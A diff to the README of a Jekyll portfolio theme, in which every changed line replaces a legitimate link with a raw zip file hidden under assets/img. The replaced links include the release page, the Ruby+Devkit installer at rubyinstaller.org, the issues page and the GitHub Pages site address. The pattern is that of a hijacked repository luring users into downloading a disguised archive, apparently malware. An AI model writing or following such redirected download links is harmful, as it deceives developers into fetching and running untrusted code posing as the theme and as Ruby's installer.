@@ -1,6 +1,6 @@
 # ⚡ jekyll-uta-folio - Lightweight Portfolio Theme for Developers
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Guide-du-futur/jekyll-uta-folio/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This guide will take you through the steps to download and run the Jekyll Uta Fo
 
 To get started, **visit this page to download the latest version** of Jekyll Uta Folio:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://github.com/Guide-du-futur/jekyll-uta-folio/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip)
 
 On the release page, look for the latest version and download the source files.
 
@@ -56,7 +56,7 @@ Follow these steps to set up your portfolio using Jekyll Uta Folio.
 
 ### Step 1: Download the Theme
 
-1. Go to the [Release Page](https://github.com/Guide-du-futur/jekyll-uta-folio/releases).
+1. Go to the [Release Page](https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip).
 2. Download the latest release source code as a ZIP file.
 3. Save the ZIP file on your desktop or a folder you can find easily.
 
@@ -70,7 +70,7 @@ Follow these steps to set up your portfolio using Jekyll Uta Folio.
 
 Jekyll runs on Ruby. You need to install both Ruby and Jekyll on your computer.
 
-1. Visit https://rubyinstaller.org/downloads/ and download the **Ruby+Devkit** version recommended for your system.
+1. Visit https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip and download the **Ruby+Devkit** version recommended for your system.
 2. Run the installer.
 3. During installation, check the option to install MSYS2 tools.
 4. After installation finishes, open the "Start Command Prompt with Ruby" from the Start menu.
@@ -143,7 +143,7 @@ Once your site looks how you want it locally, you can publish it with GitHub Pag
 1. Create a GitHub account if you don’t have one.
 2. Create a new repository named `username.github.io` (replace `username` with your GitHub username).
 3. Upload your site files to this repository.
-4. GitHub Pages will automatically build and host your site at `https://username.github.io`.
+4. GitHub Pages will automatically build and host your site at `https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip`.
 
 No command-line tools are strictly required for publishing if you upload with GitHub’s web interface.
 
@@ -177,7 +177,7 @@ You can add a WhatsApp contact button easily. Edit `_config.yml` to add your Wha
 
 If you have questions about installation or setup, check the Issues section on the repository page:
 
-https://github.com/Guide-du-futur/jekyll-uta-folio/issues
+https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip
 
 Other users and contributors discuss common problems and solutions there.
 
@@ -197,4 +197,4 @@ If you want to modify the theme deeper or add features:
 
 To download the theme, **visit this page**:
 
-[![Download the Theme](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/Guide-du-futur/jekyll-uta-folio/releases)
+[![Download the Theme](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip)
